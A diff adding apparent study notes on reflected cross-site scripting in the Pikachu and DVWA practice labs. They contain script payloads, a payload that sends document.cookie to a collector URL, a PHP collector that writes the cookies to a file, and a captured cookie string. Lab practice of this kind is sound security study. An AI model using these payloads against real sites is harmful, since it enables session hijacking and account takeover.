@@ -1,0 +1,15 @@
+反射型xss(get)
+	http://xiaoxiaoran.com/pikachu/vul/xss/xss_reflected_get.php?message=kobe&submit=submit
+		http://xiaoxiaoran.com/pikachu/vul/xss/xss_reflected_get.php?message=<script>alert(1)</script>&submit=submit
+		http://xiaoxiaoran.com/pikachu/vul/xss/xss_reflected_get.php?message=<script>alert(document.cookie)</script>&submit=submit
+
+cookies
+		http://xiaoxiaoran.com/dvwa/vulnerabilities/xss_r/?name=1#
+			<script>document.location='http://127.0.0.1/xiaoxiaoran/xss_cookie.php?cookies='+document.cookie</script>
+				xss_cookie.php
+					<?php$cookies=$_GET['cookies'];
+					file_put_contents('cookie.txt',$cookies);?>
+				cookie.txt
+					security=low; daxa_2132_lastvisit=1621075285; UM_distinctid=1798d6d59dba8-082684921c23dc-4c3f2c72-1fa400-1798d6d59ddb9; __51cke__=; PHPSESSID=heapj23qc51ouvo8ctjr3oju66; CNZZDATA155540=cnzz_eid=957036428-1621572915-&ntime=1622294410; __tins__21053225={"sid": 1622296079437, "vd": 27, "expires": 1622299213200}; __51laig__=127
+			http://xiaoxiaoran.com/dvwa/
+					
